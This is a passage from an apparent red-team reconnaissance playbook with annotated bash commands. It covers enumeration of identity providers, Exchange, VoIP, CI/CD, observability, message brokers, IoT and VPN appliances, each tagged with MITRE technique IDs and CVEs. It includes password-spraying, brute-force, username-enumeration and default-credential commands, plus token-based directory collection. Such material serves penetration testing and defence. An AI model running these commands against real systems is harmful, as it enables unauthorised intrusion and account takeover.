# vCenter SDK endpoint — version disclosed in /sdk/vimServiceVersions.xml
curl -sk "https://<target>/sdk/vimServiceVersions.xml" | grep -i version
curl -sk "https://<target>/" -o vcenter_login.html
# Banner: "vSphere Client" + version number on login page

# Critical 2021-2024 vCenter CVEs commonly encountered: CVE-2021-21972
# (vSphere Client, OGNL), CVE-2024-37079 / 37080 (DCERPC heap overflow,
# unauth RCE — patched June 2024)

# ═══════════════════════════════════════════════════════════
# SOLARWINDS ORION / NCM (8787 default, 17777 SWIS)
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>/Orion/Login.aspx" | grep -i "Orion Platform"
nmap -p 17777,8787 -sV <target>

# ═══════════════════════════════════════════════════════════
# PRTG NETWORK MONITOR (80/443/8080/8443)
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>/index.htm" | grep -i prtg
curl -sk "https://<target>/api/getstatus.htm" | grep -i version

# ═══════════════════════════════════════════════════════════
# MANAGEENGINE (varies — Endpoint Central 8020/8383, ServiceDesk 8080)
# ═══════════════════════════════════════════════════════════
nmap -p 8020,8080,8383 --script=http-title <target>
# CVE-2024-1709 (ScreenConnect auth bypass — was massively exploited Feb 2024)
# CVE-2023-29059 (3CX supply chain — historical context)

# ═══════════════════════════════════════════════════════════
# RUBRIK / COHESITY / COMMVAULT — modern backup platforms
# ═══════════════════════════════════════════════════════════
# Rubrik:  https://<target>/connector/openapi/spec
# Cohesity:https://<target>/v2/clusters
# Commvault: https://<target>/SearchSvc/CVWebService.svc/

# ═══════════════════════════════════════════════════════════
# JENKINS (8080, 50000 agent)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8080/" | grep -i "Sign in"
curl -s "http://<target>:8080/login?from=%2F" -o jenkins_login.html
# Version disclosed in X-Jenkins header
curl -sI "http://<target>:8080/" | grep -i "X-Jenkins"
# CVE-2024-23897 — file-read → RCE chain (mass-exploited Q1 2024)

# Script Console (auth required; if accessible = full Groovy code execution)
# http://<target>:8080/script

# ═══════════════════════════════════════════════════════════
# TEAMCITY (8111)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8111/login.html" | grep -i teamcity
# CVE-2024-27198 (auth bypass — March 2024, mass-exploited within days)
# CVE-2023-42793 (auth bypass; legacy still encountered)

# ═══════════════════════════════════════════════════════════
# GITLAB CE/EE
# ═══════════════════════════════════════════════════════════
curl -s "https://<target>/help" | grep -i "GitLab"
# Self-hosted GitLab versions visible in footer
```

### 3.11 — Identity-Plane Active Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# ENTRA ID — POST-CREDENTIAL ENUMERATION
# MITRE ATT&CK: T1087.004 (Cloud Account Discovery), T1518 (Software Discovery)
# NOISE LEVEL:  LOW per query; HIGH if bulk graph traversal triggers anomaly
# DETECTION:    Entra Sign-in logs + Identity Protection (atypical sign-in,
#               anonymous IP, malware-linked IP detections); MDCA
#               (Defender for Cloud Apps) for SaaS-side anomaly
# ═══════════════════════════════════════════════════════════
# Cross-reference passive recon §7.3 for unauthenticated tenant outsider
# recon (GetUserRealm, OpenID config, AADInternals Invoke-AADIntReconAsOutsider).

# AzureHound (SpecterOps) — v2.11.0+ as of March 2026
# Weaponized by Storm-0501 and Void Blizzard per MS Threat Intel Aug 2025
# Source: https://github.com/SpecterOps/AzureHound
azurehound list --jwt <BEARER_TOKEN> -o azurehound.json

# Or with creds:
azurehound -u user@target.com -p 'pass' --tenant target.com list

# ROADtools (dirkjanm) — POST-credential Entra enum + abuse
# Note: as of April 2026, some Graph endpoints used by `roadrecon gather`
# return HTTP 403 in certain tenant configurations (Microsoft tightening)
roadrecon auth -u user@target.com -p 'pass'
roadrecon gather                              # May fail on hardened tenants
roadrecon gui                                 # Browse the gathered graph

# ROADtx (token manipulation)
roadtx auth -u user@target.com -p 'pass' -r https://graph.microsoft.com
roadtx browserprtauth                         # PRT-based browser auth flow

# Microsoft Graph direct queries (with token)
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/users?\$top=999" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/groups" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/applications" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/directoryRoles" -H "Authorization: Bearer $TOKEN"

# AADInternals (post-cred — also has outsider-recon modules in passive recon §7.3)
Invoke-AADIntUserEnumerationAsOutsider -UserName "@target.com" -External
Get-AADIntUsers -AccessToken $token

# ═══════════════════════════════════════════════════════════
# OKTA / AUTH0 USERNAME VALIDATION (response-time analysis)
# MITRE ATT&CK: T1087, T1110.003 (Password Spraying)
# NOISE LEVEL:  HIGH if uncontrolled; Okta + Auth0 detect rapid auth attempts
# DETECTION:    Okta Threat Insight (Q4 2024+ feature) blocks suspicious IPs
# ═══════════════════════════════════════════════════════════
# Username validation (existence check via response-time delta — usernames
# that exist in directory return slightly slower responses than non-existent)

# Okta primary auth endpoint
curl -X POST "https://target.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"user@target.com","password":"InvalidProbeXyz123"}' \
  -w "Time: %{time_total}\n"

# Auth0 username validation via /co/authenticate (deprecated) or
# /authorize endpoint behavior
curl -s "https://target.auth0.com/co/authenticate" \
  -H "Content-Type: application/json" \
  -d '{"username":"user@target.com","password":"x"}'

# Microsoft 365 username validation
# o365creeper / MailSniper / MSOLSpray patterns
# Send AAD authentication request and parse response code:
curl -s "https://login.microsoftonline.com/common/oauth2/token" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&\
username=user@target.com&password=Probe123!&scope=openid&\
resource=https://graph.windows.net"
# Response codes that confirm user existence:
#   AADSTS50034 = user does not exist
#   AADSTS50053 = account locked
#   AADSTS50056 = invalid pw (USER EXISTS)
#   AADSTS50057 = account disabled (USER EXISTS)
#   AADSTS50126 = invalid pw (USER EXISTS)
#   AADSTS500011 = resource not found in tenant
#   AADSTS65001 = consent required (USER EXISTS)

# ═══════════════════════════════════════════════════════════
# ADFS ENDPOINT DISCOVERY
# MITRE ATT&CK: T1591.002, T1590.001
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
# Discover ADFS via standard endpoints
curl -sk "https://sts.target.com/adfs/services/trust/2005/usernamemixed"
curl -sk "https://sts.target.com/adfs/ls/?wa=wsignin1.0"
curl -sk "https://sts.target.com/FederationMetadata/2007-06/FederationMetadata.xml"
curl -sk "https://sts.target.com/adfs/oauth2/.well-known/openid-configuration"

# ADFSpray (username spray against ADFS)
adfspray.py -t target.com -U users.txt -p 'Spring2026!'
```

### 3.12 — Mail / Exchange / Calendar

```bash
# ═══════════════════════════════════════════════════════════
# EXCHANGE / OWA / EWS ENDPOINT FINGERPRINTING
# MITRE ATT&CK: T1078, T1046, T1199 (Trusted Relationship — Exchange)
# NOISE LEVEL:  LOW (single GET) to MEDIUM (auth attempts)
# DETECTION:    IIS access logs; Exchange CAS logs; Defender for Office 365
# ═══════════════════════════════════════════════════════════
# Exchange version disclosure via /owa/auth/logon.aspx OWA build number
curl -sk "https://target.com/owa/auth/logon.aspx" | grep -oE "/owa/[0-9.]+/themes"
# Build number → KB lookup at https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates

# Common Exchange/OWA endpoints to probe:
curl -sk "https://target.com/owa/"                         # OWA root
curl -sk "https://target.com/ecp/"                         # Exchange Control Panel
curl -sk "https://target.com/ews/Exchange.asmx"            # EWS endpoint
curl -sk "https://target.com/EWS/Services.wsdl"            # EWS WSDL
curl -sk "https://target.com/mapi/emsmdb"                  # MAPI/HTTP
curl -sk "https://target.com/oab/"                         # Offline Address Book
curl -sk "https://target.com/microsoft-server-activesync/" # ActiveSync
curl -sk "https://target.com/autodiscover/autodiscover.xml" # AutoDiscover
curl -sk "https://target.com/rpc/rpcproxy.dll"             # RPC over HTTP
curl -sk "https://target.com/PowerShell/"                  # Exchange PowerShell

# CVE landscape (2024-2026, currently encountered):
# - ProxyLogon / ProxyShell / ProxyToken (2021) — legacy still surfacing
# - CVE-2023-23397 (Outlook NTLM elevation via calendar invite)
#   — patched March 2023; still surfaces on legacy Outlook clients
# - CVE-2024-49040 (spoofing in Exchange Server)
# - CVE-2024-21410 (Exchange privilege elevation via NTLM relay)

# Exchange version → patch-level matrix
# https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates

# ═══════════════════════════════════════════════════════════
# IMAP / POP3 / CalDAV / CardDAV
# ═══════════════════════════════════════════════════════════
nmap --script=imap-capabilities,imap-brute -p 143,993 <target>
nmap --script=pop3-capabilities,pop3-brute -p 110,995 <target>

# CalDAV / CardDAV (calendar / contacts protocols — RFC 4791 / 6352)
curl -X PROPFIND "https://target.com/caldav/" \
  -H "Depth: 0" -H "Content-Type: application/xml" \
  -u user:pass --data '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:prop><D:resourcetype/><D:displayname/></D:prop></D:propfind>'

# Apple iCloud / Google Calendar / Microsoft Exchange — all support CalDAV
# but with vendor-specific endpoint paths
```

### 3.13 — VoIP / SIP

```bash
# ═══════════════════════════════════════════════════════════
# SIP ENUMERATION (5060 UDP / 5061 TLS)
# MITRE ATT&CK: T1046, T1018, T1110.001
# NOISE LEVEL:  LOW (single REGISTER) to HIGH (extension brute)
# DETECTION:    SIP server logs; SIP-aware firewalls (Acme Packet,
#               Oracle Communications) flag scan-like REGISTER patterns
# ═══════════════════════════════════════════════════════════
# SIPVicious — primary SIP scanning toolkit
svmap <target>                                # Scan for SIP devices
svmap 10.0.0.0/24

# Extension enumeration (REGISTER probes per extension)
svwar -e 100-999 <target>

# Password brute against extension
svcrack -u 105 -d /usr/share/wordlists/sip-passwords.txt <target>

# Cisco Unified Communications Manager (CUCM)
# Common ports: 5060/5061 SIP, 8080/8443 web admin, 2748 CTL
curl -sk "https://<target>:8443/ccmadmin/showHome.do" | grep -i "Cisco Unified CM"

# 3CX Phone System
# Common ports: 5060/5061, 5090/5091 (web), 443 (mgmt)
curl -sk "https://<target>:5001/" | grep -i 3cx

# Asterisk / FreePBX
# Default port: 5060 SIP, 4569 IAX2, 5038 AMI (manager interface)
nc -nv <target> 5038                          # Asterisk Manager Interface banner
# Default Asterisk creds historically: admin:amp111 (FreePBX), admin:admin

# 2024 vulnerability landscape:
# - CVE-2024-12686 (BeyondTrust Privileged Remote Access — adjacent IT admin)
# - SIP server CVEs in Asterisk/FreePBX historically encountered

# ═══════════════════════════════════════════════════════════
# H.323 (1720 — legacy enterprise VoIP/video)
# ═══════════════════════════════════════════════════════════
nmap -p 1720 --script=h323-* <target>

# ═══════════════════════════════════════════════════════════
# WebRTC STUN/TURN (3478 UDP/TCP, 5349 TLS)
# ═══════════════════════════════════════════════════════════
# STUN binding probe (reveals NAT / public-IP behavior)
nmap -p 3478 --script=stun-info <target>

# TURN credential probe (open relay test)
# turnutils_uclient is part of coturn; probe for auth/anon-allow
turnutils_uclient -u user -w password <target>
```

### 3.14 — CI/CD Pipeline Endpoints

```bash
# ═══════════════════════════════════════════════════════════
# JENKINS (8080, 50000 agent)  — already covered §3.10
# Re-listed here as part of CI/CD enumeration spine
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# TEAMCITY (8111)  — already covered §3.10
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# BAMBOO (8085)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8085/" | grep -i bamboo

# ═══════════════════════════════════════════════════════════
# GoCD (8153 HTTP / 8154 HTTPS)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8153/go/" | grep -i "GoCD"

# ═══════════════════════════════════════════════════════════
# ARGOCD (443 / 80 — ingress-exposed)
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>/api/version" | jq
# Anonymous auth — sometimes enabled by default on dev installs
curl -sk "https://<target>/api/v1/applications" -H "Cookie: argocd.token=" 

# ═══════════════════════════════════════════════════════════
# SPINNAKER / TEKTON / DRONE / CONCOURSE / BUILDKITE
# ═══════════════════════════════════════════════════════════
# Spinnaker dashboard: 9000 (Deck UI), 8084 (Gate API)
# Tekton: K8s-native; tkn CLI; dashboard often at /tekton path
# Drone CI: 8000 (server), 9000 (RPC)
# Concourse: 8080 (web), 2222 (TSA)
# Buildkite agents: hosted; agents have specific User-Agent identifying them

# Public Drone CI dashboards (Shodan-discoverable — passive recon §5.8)
# nmap probe:
nmap -p 8000 --script=http-title <target>
```

### 3.15 — Observability Infrastructure

```bash
# ═══════════════════════════════════════════════════════════
# GRAFANA (3000) — frequent unauth-by-default
# MITRE ATT&CK: T1046, T1083
# NOISE LEVEL:  LOW probe; MEDIUM enumeration
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:3000/api/health"     # Health check (always anonymous)
curl -s "http://<target>:3000/api/orgs"       # Orgs (anon if disabled-auth)
curl -s "http://<target>:3000/api/datasources" # Datasources (creds-leak risk)
curl -s "http://<target>:3000/api/dashboards/db" # Dashboard list

# CVE-2024-1313 / 9264 — Grafana path-traversal CVEs (legacy)

# ═══════════════════════════════════════════════════════════
# KIBANA (5601)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:5601/api/status" | jq
curl -s "http://<target>:5601/api/console/proxy?path=/_cat/indices&method=GET"
# Console proxy = full Elasticsearch access through Kibana auth boundary

# ═══════════════════════════════════════════════════════════
# PROMETHEUS (9090)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:9090/api/v1/status/config" | jq
curl -s "http://<target>:9090/api/v1/targets"      # All scrape targets
curl -s "http://<target>:9090/api/v1/label/__name__/values"  # All metrics
# Metrics frequently leak: hostnames, service inventory, internal URLs,
# version strings of every monitored component

# ═══════════════════════════════════════════════════════════
# JAEGER (16686 web, 14250 gRPC, 14268 HTTP)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:16686/api/services" | jq
curl -s "http://<target>:16686/api/traces?service=<svc>&limit=20" | jq

# ═══════════════════════════════════════════════════════════
# LOKI (3100)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:3100/ready"
curl -s "http://<target>:3100/loki/api/v1/labels" | jq
curl -s "http://<target>:3100/loki/api/v1/query?query={job=\"varlogs\"}" | jq

# ═══════════════════════════════════════════════════════════
# DATADOG / SPLUNK FORWARDER PORTS
# ═══════════════════════════════════════════════════════════
# Splunk HEC (HTTP Event Collector): 8088 — anon submit if disabled-token
# Splunk mgmt: 8089 — REST API (auth required)
# Datadog Agent: 8125 (StatsD UDP), 8126 (APM)
nmap -p 8088,8089,8125,8126 -sV <target>
```

### 3.16 — Internal Package Registries / Artifact Stores

```bash
# ═══════════════════════════════════════════════════════════
# JFROG ARTIFACTORY (8081 default, 80/443 production)
# MITRE ATT&CK: T1046, T1083, T1199 (Trusted Relationship)
# NOISE LEVEL:  LOW probe to MEDIUM (anon repo listing)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8081/artifactory/api/system/ping"
curl -s "http://<target>:8081/artifactory/api/repositories" | jq
curl -s "http://<target>:8081/artifactory/api/security/users" | jq # auth req'd

# ═══════════════════════════════════════════════════════════
# SONATYPE NEXUS REPOSITORY (8081 default — same as Artifactory!)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8081/service/rest/v1/repositories" | jq
curl -s "http://<target>:8081/service/rest/v1/status"
# Default credentials historically admin:admin123 (post-Nexus 3.17, must be
# changed on first install — but often left default)

# ═══════════════════════════════════════════════════════════
# HARBOR (443)
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>/api/v2.0/health"
curl -sk "https://<target>/api/v2.0/projects" # Anon if public projects enabled

# ═══════════════════════════════════════════════════════════
# INTERNAL NPM MIRROR / VERDACCIO / SINOPIA
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:4873/-/all"          # Verdaccio package list
curl -s "http://<target>:4873/-/whoami"       # Auth check

# ═══════════════════════════════════════════════════════════
# AWS CODEARTIFACT / GITHUB PACKAGES ENTERPRISE
# ═══════════════════════════════════════════════════════════
# Pattern: <domain>.<region>.amazonaws.com (CodeArtifact)
# Pattern: <enterprise>.ghe.io/_packages (GitHub Enterprise)
nslookup <target>.us-east-1.codeartifact.<region>.amazonaws.com
```

### 3.17 — Container Runtime Socket Exposure (cross-ref §3.8)

```bash
# ═══════════════════════════════════════════════════════════
# DOCKER DAEMON ON TCP (2375 unauth, 2376 TLS)
# Already covered §3.8 — extending here for runtime-socket family
# MITRE ATT&CK: T1610 (Deploy Container), T1612 (Build Image on Host)
# NOISE LEVEL:  LOW (probe); HIGH (RCE-equivalent if accessible)
# ═══════════════════════════════════════════════════════════
# (See §3.8 for Docker probe commands)

# Containerd via TCP (rare but encountered):
# Default Unix socket: /run/containerd/containerd.sock
# TCP exposure unusual; if found, ctr command tool:
ctr --address /run/containerd/containerd.sock containers list

# Podman socket — rest API
# /run/podman/podman.sock (root) or $XDG_RUNTIME_DIR/podman/podman.sock (rootless)
curl --unix-socket /run/podman/podman.sock http://localhost/v3.0.0/libpod/containers/json
```

### 3.18 — Message Brokers

```bash
# ═══════════════════════════════════════════════════════════
# RABBITMQ (5672 AMQP, 15672 mgmt, 25672 cluster)
# MITRE ATT&CK: T1046, T1078
# NOISE LEVEL:  LOW probe; MEDIUM (default-cred test)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:15672/api/overview" -u guest:guest | jq
# Default creds: guest:guest (only allowed from localhost since RabbitMQ 3.3.0)
# If guest works remotely → misconfiguration → high-value foothold

curl -s "http://<target>:15672/api/users" -u admin:admin
curl -s "http://<target>:15672/api/queues" -u admin:admin

# ═══════════════════════════════════════════════════════════
# KAFKA (9092 PLAINTEXT, 9093 SASL_SSL, 9094 SSL)
# ═══════════════════════════════════════════════════════════
# kcat (formerly kafkacat) — broker / topic enumeration
kcat -L -b <target>:9092                      # List brokers + topics + partitions
kcat -C -b <target>:9092 -t <topic> -o end -e # Consume from end (test access)

# Kafka by default has NO AUTH; production deployments commonly use SASL/SCRAM
# but development clusters frequently exposed without auth

# Apache ZooKeeper (Kafka backend): 2181, 8080 admin
echo "envi" | nc <target> 2181                # Four-letter command (envi)
echo "stat" | nc <target> 2181                # Stats

# ═══════════════════════════════════════════════════════════
# ACTIVEMQ (61616 OpenWire, 8161 mgmt UI, 5672 AMQP)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8161/admin/" -u admin:admin
# Default creds: admin:admin (often unchanged)
# CVE-2023-46604 — unauth RCE via OpenWire (massively exploited 2023-2024)

# ═══════════════════════════════════════════════════════════
# NATS (4222 client, 8222 monitoring)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8222/varz" | jq      # Server info
curl -s "http://<target>:8222/connz" | jq     # Active connections
curl -s "http://<target>:8222/subsz" | jq     # Subscriptions

# ═══════════════════════════════════════════════════════════
# MQTT (1883 PLAIN, 8883 TLS)
# ═══════════════════════════════════════════════════════════
mosquitto_sub -h <target> -p 1883 -t '#' -v   # Subscribe to all topics
                                              # NO AUTH by default — IoT broker
                                              # leakage of device telemetry

# ═══════════════════════════════════════════════════════════
# AMQP 0.9.1 / 1.0 (generic — RabbitMQ uses 0.9.1; ActiveMQ also)
# ═══════════════════════════════════════════════════════════
nmap -p 5672 --script=amqp-info <target>
```

### 3.19 — Print / IoT / IP-Camera Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# PRINTER ENUMERATION
# MITRE ATT&CK: T1046, T1078, T1552 (Unsecured Credentials)
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
# JetDirect / RAW print (port 9100) — TCP banner
nc -nv <target> 9100                          # Often reveals printer model
nmap -p 9100 --script=jetdirect-info <target>

# IPP / IPPS (Internet Printing Protocol — port 631)
ipptool -tv ipp://<target>/printers/printer-name get-printer-attributes.test
nmap -p 631 --script=ipp-info,ipp-* <target>

# LPR / LPD (port 515 — legacy)
nmap -p 515 --script=lpd-* <target>

# PRET (Printer Exploitation Toolkit) — IPP/PJL/PostScript abuse
# https://github.com/RUB-NDS/PRET (legacy but functional)
pret <target> pjl
pret <target> ps
pret <target> pcl

# Praeda (printer config/cred extraction)
# https://github.com/percx/Praeda

# What printers leak:
# - LDAP bind credentials (printer authenticates to LDAP for address book)
# - SMTP credentials (scan-to-email)
# - SMB share credentials (scan-to-folder)
# - Address book (internal email list)
# - Default admin creds (admin / admin / nobody)

# ═══════════════════════════════════════════════════════════
# IP CAMERAS / NVR / DVR
# ═══════════════════════════════════════════════════════════
# RTSP (554) — common camera streaming protocol
nmap -p 554 --script=rtsp-* <target>
ffprobe rtsp://<target>:554/stream1            # Test stream

# ONVIF (3702 multicast discovery, then HTTP/HTTPS for device service)
nmap -p 3702 --script=onvif-discovery -e eth0
# After discovery: device service URL pattern http://<ip>:80/onvif/device_service

# Hikvision SDK port (8000 default, 8200 alt)
# Default creds: admin/12345 (legacy), admin/admin (newer factory defaults)
nmap -p 8000,8200 --script=http-title <target>

# Dahua: port 37777 (binary), 80/443 (web)
nmap -p 37777 -sV <target>

# Axis: port 80 (web), 80 (vapix API)
curl -s "http://<target>/axis-cgi/serverreport.cgi"

# ═══════════════════════════════════════════════════════════
# BUILDING AUTOMATION (BAS / HVAC)
# ═══════════════════════════════════════════════════════════
# BACnet (47808 UDP) — see §7 ICS section for full coverage
# KNX (3671 UDP) — building-control protocol
nmap -p 3671 --script=knx-gateway-discover -e eth0

# ═══════════════════════════════════════════════════════════
# SMART TVs / CAST DEVICES (BYOD / conference rooms)
# ═══════════════════════════════════════════════════════════
# Chromecast / Google Cast: 8008 HTTP, 8009 HTTPS
nmap -p 8008,8009 --script=http-title <target>

# Apple AirPlay: 7000 HTTP, 7100 alt
nmap -p 7000,7100 -sV <target>

# Roku: 8060 ECP (External Control Protocol)
curl -s "http://<target>:8060/query/device-info"
```

### 3.20 — Apple Ecosystem mDNS Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# APPLE-SPECIFIC mDNS SERVICES
# MITRE ATT&CK: T1046
# NOISE LEVEL:  LOW (multicast)
# ═══════════════════════════════════════════════════════════
dns-sd -B _airplay._tcp local.                # AirPlay (Apple TV, AirPort)
dns-sd -B _airdrop._tcp local.                # AirDrop
dns-sd -B _ipp._tcp local.                    # AirPrint
dns-sd -B _hap._tcp local.                    # HomeKit
dns-sd -B _raop._tcp local.                   # AirTunes
dns-sd -B _adisk._tcp local.                  # AirDisk
dns-sd -B _afpovertcp._tcp local.             # AFP shares
dns-sd -B _appleboot._tcp local.              # NetBoot
dns-sd -B _device-info._tcp local.            # Generic device info

# Resolve a discovered service to host + port
dns-sd -L <service-name> _airplay._tcp local.

# avahi equivalents (Linux):
avahi-browse -art _airplay._tcp
avahi-browse -art _ipp._tcp
```

### 3.21 — Service Mesh Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# ISTIO (15010-15021 control-plane ports)
# MITRE ATT&CK: T1046, T1083
# ═══════════════════════════════════════════════════════════
# Pilot (config) admin:
curl -s "http://<target>:15010/debug/syncz"   # Config sync
curl -s "http://<target>:15014/debug/registryz" # Service registry
# Citadel: 15011 (mTLS bootstrap)
# Galley: 15019 (config validation)

# Envoy admin endpoint (15000 default — UNAUTH config dump on misconfigured)
curl -s "http://<target>:15000/config_dump" | jq
curl -s "http://<target>:15000/clusters"
curl -s "http://<target>:15000/listeners"

# ═══════════════════════════════════════════════════════════
# LINKERD (4191 admin, 4143 proxy inbound)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:4191/metrics"        # Proxy metrics
curl -s "http://<target>:4191/ready"
curl -s "http://<target>:4191/admin/probe"

# ═══════════════════════════════════════════════════════════
# CONSUL CONNECT (8500 HTTP API, 8600 DNS)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8500/v1/catalog/services" | jq
curl -s "http://<target>:8500/v1/agent/members" | jq
curl -s "http://<target>:8500/v1/connect/intentions" | jq
```

### 3.22 — Internal Recon Through Existing C2 (cross-ref §1.5)

(See §1.5 — same techniques apply per-protocol within established beacons.)

```
═══════════════════════════════════════════════════════════
SECTION 3 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Each subsection enables a follow-on tactic:
  3.1 SMB        → §03 Initial Access (NTLM relay if signing weak)
  3.2 LDAP       → §08 AD deep dive (BloodHound CE collection)
  3.3 Kerberos   → §05 Privilege Escalation (Kerberoasting cracks)
  3.7 Databases  → §07 Exfiltration (data theft via direct DB access)
  3.8 K8s        → §05 Privilege Escalation (kubelet exec abuse)
  3.10 Backup    → §04 Persistence + ransomware-pivot kill chain
  3.11 Identity  → §03 Initial Access (token theft, OAuth phish)
Cross-ref → §4 edge appliances (parallel external-facing recon)
Cross-ref → §6 cloud (overlapping cloud-asset enumeration)
```

---

## 4 — EDGE / VPN APPLIANCE FINGERPRINTING

> **Typical chains through this section:** External port scan (§2) → identify port 443 / 4443 / 8443 / 10443 hosts → fingerprint vendor via login-page paths → match against current CVE matrix → if vulnerable, hand off to exploit-development / N-day chain (out of scope here). Edge appliances are the **#1 IAB initial-access vector** in 2023-2026 per CrowdStrike GTR, Mandiant M-Trends, and Microsoft Digital Defense Report.

### 4.1 — Cisco Secure Client (post-2022 AnyConnect rebrand)

```bash
# ═══════════════════════════════════════════════════════════
# CISCO SECURE CLIENT (formerly AnyConnect, renamed 29 July 2022)
# Legacy AnyConnect EOL: 31 March 2024
# MITRE ATT&CK: T1190 (Exploit Public-Facing Application — adjacent)
# NOISE LEVEL:  LOW (recognition probe)
# ═══════════════════════════════════════════════════════════
# Recognition endpoints:
curl -sk "https://<target>/+CSCOE+/logon.html" | grep -i "Secure Client\|AnyConnect"
curl -sk "https://<target>/+webvpn+/index.html" | grep -i "Cisco"
curl -sk "https://<target>/CACHE/sdesktop/install/binaries/sfinst" 2>/dev/null

# ASA / FTD identification:
curl -sk "https://<target>/admin/public/index.html"
nmap --script=ssl-cert -p 443 <target> | grep -i "ASA\|Cisco"

# Source: https://blogs.cisco.com/security/more-than-a-vpn-announcing-cisco-secure-client-formerly-anyconnect
```

### 4.2 — Palo Alto GlobalProtect

```bash
# ═══════════════════════════════════════════════════════════
# PALO ALTO GLOBALPROTECT (port 443, 4443)
# MITRE ATT&CK: T1190
# NOISE LEVEL:  LOW (recognition); HIGH if scanning known-CVE paths
# ═══════════════════════════════════════════════════════════
# Recognition:
curl -sk "https://<target>/global-protect/login.esp" | grep -i "GlobalProtect"
curl -sk "https://<target>/global-protect/portal/portal-config.esp" -H "X-Requested-With: GlobalProtect"
curl -sk "https://<target>/sslmgr"            # SSL Manager endpoint

# CVE-2024-3400 — UNAUTHENTICATED RCE (CVSS 10.0)
# Affects: PAN-OS 10.2.x, 11.0.x, 11.1.x with GlobalProtect Gateway/Portal +
# device telemetry enabled
# Status: Active exploitation through Sept 2025 per Palo Alto Networks
# Patches: 10.2.9-h1, 11.0.4-h1, 11.1.2-h3 and later
# Source: https://security.paloaltonetworks.com/CVE-2024-3400

# Quick fingerprint
curl -sk "https://<target>/api/?type=keygen&user=admin&password=admin"
# (Returns API endpoint structure — version sometimes leaked in error format)
```

### 4.3 — Fortinet SSL VPN / FortiManager / FortiAnalyzer

```bash
# ═══════════════════════════════════════════════════════════
# FORTINET FORTIGATE SSL VPN (port 443, 10443)
# MITRE ATT&CK: T1190
# NOISE LEVEL:  LOW (recognition)
# ═══════════════════════════════════════════════════════════
# Recognition:
curl -sk "https://<target>/remote/login" | grep -i "FortiGate\|Fortinet"
curl -sk "https://<target>/remote/fgt_lang" -H "Cookie: SVPNCOOKIE=" | head
curl -sk "https://<target>:10443/remote/login"

# Version disclosure via SSL cert subject + body
nmap -p 443,10443 --script=ssl-cert <target> | grep -i Fortinet

# CRITICAL CVEs:
# CVE-2024-21762 — out-of-bounds RCE in SSLVPNd (CVSS 9.8)
# Status: CISA KEV listed Feb 2024; post-exploitation abuse documented
# April 2025
# Source: https://www.cisa.gov/news-events/alerts/2025/04/11/...

# CVE-2024-47575 — FortiManager mass compromise (June 2024+)
# 50+ FortiManager instances compromised per Mandiant
# Source: https://cloud.google.com/blog/topics/threat-intelligence/fortimanager-zero-day-exploitation-cve-2024-47575

# FortiManager / FortiAnalyzer (port 443, 541, 8013)
curl -sk "https://<target>/p/login/" | grep -i FortiManager
nmap -p 541,8013,443 --script=http-title <target>
```

### 4.4 — Citrix NetScaler / NetScaler Gateway

```bash
# ═══════════════════════════════════════════════════════════
# CITRIX NETSCALER (port 443, 4443)
# MITRE ATT&CK: T1190
# NOISE LEVEL:  LOW (recognition)
# ═══════════════════════════════════════════════════════════
# Recognition:
curl -sk "https://<target>/vpn/index.html" | grep -i "NetScaler\|Citrix"
curl -sk "https://<target>/logon/LogonPoint/tmindex.html"
curl -sk "https://<target>/nf/auth/doLogout.do"
curl -sk "https://<target>/citrix/Receiver/" | head

# Version disclosure (legacy):
curl -sk "https://<target>/vpn/serverconfig.xml" 2>/dev/null

# CVEs:
# CVE-2023-3519 (Citrix Bleed predecessor — 2023)
# CVE-2023-4966 (Citrix Bleed — session token leak; mass-exploited Q4 2023)
# CVE-2024-3661 (TunnelVision — DHCP option 121 attack)
# CVE-2024-8534/8535 — memory safety vulns; patched Nov 2024
# Source: https://www.netscaler.com/blog/news/cve-2024-8534-and-cve-2024-8535-...
```

### 4.5 — Ivanti Connect Secure / Pulse Secure

```bash
# ═══════════════════════════════════════════════════════════
# IVANTI CONNECT SECURE (formerly Pulse Connect Secure)
# Default port: 443
# MITRE ATT&CK: T1190
# NOISE LEVEL:  LOW (recognition); HIGH (CVE probing)
# ═══════════════════════════════════════════════════════════
# Recognition:
